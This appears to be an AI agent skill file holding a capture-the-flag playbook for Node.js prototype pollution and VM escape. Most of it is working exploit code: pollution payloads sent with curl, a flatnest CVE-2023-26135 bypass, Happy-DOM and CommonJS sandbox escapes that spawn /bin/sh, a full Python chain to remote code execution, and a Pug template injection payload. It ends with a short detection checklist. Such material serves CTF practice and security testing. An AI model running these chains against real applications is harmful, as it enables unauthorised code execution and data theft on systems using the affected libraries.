---
name: web-node-prototype
description: "CTF Node.js prototype pollution and VM escape. flatnest CVE-2023-26135, lodash merge pollution, Pug AST injection, Happy-DOM VM escape, full pollution-to-RCE chains. Triggers: 'prototype pollution', 'node js ctf', 'vm escape', 'lodash merge', 'happy-dom', 'flatnest', 'pug injection', 'javascript prototype', 'node ctf'."
---

# CTF: Node.js Prototype Pollution & VM Escape

Prototype pollution via merge libraries → gadgets in Happy-DOM/Pug → VM sandbox escape → RCE.

---

## Phase 1: Prototype Pollution Detection

```javascript
// Basic probe payloads:
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}

// Verify pollution in response or behavior change:
// Send probe, then send: {} → check if {}.isAdmin === true
```

```bash
# Test via curl:
curl -X POST http://TARGET/api/config \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

# Follow up request to check effect:
curl -s http://TARGET/api/whoami | jq .isAdmin
```

---

## Phase 2: flatnest Circular Reference Bypass (CVE-2023-26135)

```bash
# flatnest seek() has no __proto__ check: use [Circular (path)] value:

curl -X POST http://TARGET/config \
  -H "Content-Type: application/json" \
  -d '{
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": true,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": true
  }'

# Verify pollution:
curl -s http://TARGET/api/settings | jq .enableJavaScriptEvaluation
```

---

## Phase 3: Gadget: Happy-DOM JS Eval Enable

```javascript
// Happy-DOM < 20.0.0 reads settings from options.settings
// If options has no own 'settings', falls through to Object.prototype:
// → Our pollution makes enableJavaScriptEvaluation = true

// Then trigger script execution via document.write():
// document.write() sets evaluateScripts: true → scripts execute
```

---

## Phase 4: VM Sandbox Escape

### ESM-Compatible (CVE-2025-61927)

```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return globalThis.process")();
const spawnSync = proc.binding("spawn_sync");
const result = spawnSync.spawn({
  file: "/bin/sh",
  args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [
    { type: "pipe", readable: true, writable: false },
    { type: "pipe", readable: false, writable: true },
    { type: "pipe", readable: false, writable: true }
  ]
});
const output = Buffer.from(result.output[1]).toString();
document.title = output;   // Exfil via title if blind
```

### CommonJS Escape

```javascript
const ForeignFunction = this.constructor.constructor;
const proc = ForeignFunction("return process")();
const result = proc.mainModule.require("child_process").execSync("cat /flag*").toString();
```

---

## Phase 5: Full Chain Exploit: flatnest → Happy-DOM → RCE

```python
import requests
TARGET = "http://TARGET:3000"

# Step 1: Pollute Object.prototype via flatnest CVE:
pollution = {
    "x": "[Circular (constructor.prototype)]",
    "x.settings.enableJavaScriptEvaluation": True,
    "x.settings.suppressInsecureJavaScriptEnvironmentWarning": True
}
requests.post(f"{TARGET}/config", json=pollution)

# Step 2: VM escape via rendered HTML with script tag:
rce_script = """
const F = this.constructor.constructor;
const proc = F("return globalThis.process")();
const s = proc.binding("spawn_sync");
const r = s.spawn({
  file: "/bin/sh", args: ["/bin/sh", "-c", "cat /flag*"],
  stdio: [{type:"pipe",readable:true,writable:false},
          {type:"pipe",readable:false,writable:true},
          {type:"pipe",readable:false,writable:true}]
});
document.title = Buffer.from(r.output[1]).toString();
"""

r = requests.post(f"{TARGET}/render", json={"html": f"<script>{rce_script}</script>"})
print(r.text.split("<title>")[1].split("</title>")[0])
```

---

## Phase 6: Lodash Prototype Pollution → Pug AST Injection

```json
{
  "constructor": {
    "prototype": {
      "block": {
        "type": "Text",
        "line": "1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//",
        "val": "x"
      }
    }
  },
  "word": "exploit"
}
```

```bash
# Send base64-encoded:
python3 -c "
import json, base64

payload = {
    'constructor': {
        'prototype': {
            'block': {
                'type': 'Text',
                'line': \"1;pug_html+=global.process.mainModule.require('fs').readFileSync('/app/flag.txt').toString();//\",
                'val': 'x'
            }
        }
    },
    'word': 'exploit'
}
print(base64.b64encode(json.dumps(payload).encode()).decode())
"

# Use as: ?data=<base64_output>
```

---

## Detection Checklist

```bash
# Check package.json for vulnerable libraries:
cat package.json | jq '.dependencies | to_entries[] | select(.key | test("flatnest|lodash|merge|deep-extend|qs"))'

# Look for patterns:
grep -rn "nest\|merge\|extend" src/ | grep -v "node_modules"

# Check Happy-DOM / jsdom rendering:
grep -rn "happy-dom\|jsdom\|vm\." src/

# Find postMessage listeners:
grep -rn "addEventListener.*message\|postMessage" public/ src/
```

---

## Affected Versions

| Library | Vulnerability | Fixed in |
|:--------|:-------------|:---------|
| flatnest | CVE-2023-26135, seek() circular ref bypass | Not fully patched |
| lodash | Prototype pollution via _.merge() | 4.17.5+ |
| happy-dom | JS eval bypass via pollution | 20.x+ |
| vm2 | VM sandbox escape | Deprecated |

---

## Output

Save to `.omop/engagement/ctf/web/`:
- `pollution-payload.json`: working prototype pollution payload
- `rce-script.js`: VM escape + flag read script
- `flag.txt`: captured flag

## Next Phase

→ `ctf-web-server-side` for traditional server-side injection
→ `ctf-exploit` for binary exploitation chains
